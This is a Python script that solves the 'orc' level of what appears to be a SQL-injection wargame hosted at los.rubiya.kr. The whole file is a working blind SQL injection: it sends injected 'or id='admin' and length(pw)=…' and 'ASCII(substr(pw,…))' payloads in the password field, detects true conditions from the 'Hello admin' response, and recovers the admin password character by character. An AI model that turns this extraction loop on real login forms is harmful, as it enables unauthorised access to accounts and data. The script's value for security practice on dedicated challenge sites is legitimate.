from requests import get
import string
from time import sleep

url = "https://los.rubiya.kr/chall/orc.php"

cookies = dict(PHPSESSID="")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

for i in range(1,20):
    parameter = "?id=admin&pw=1'or id='admin' and length(pw)='"+ str(i) + "%23"
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("Hello admin") > 0:
        length = i + 1
        print("password length is " + str(i))
        break
for i in range(1, length):
    for a in alpha:
        parameter = "?id=admin&pw=1'or id='admin' and ASCII(substr(pw,"+ str(i)+",1))="+str(ord(a))+"%23"
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print(str(i) + " -> " + a)
            result += a
            break

    if i == 1 and result == "":
        print("password not found")
        exit(0)

    if i == length-1:
        print("\npassword is "+result)
        print("\n")
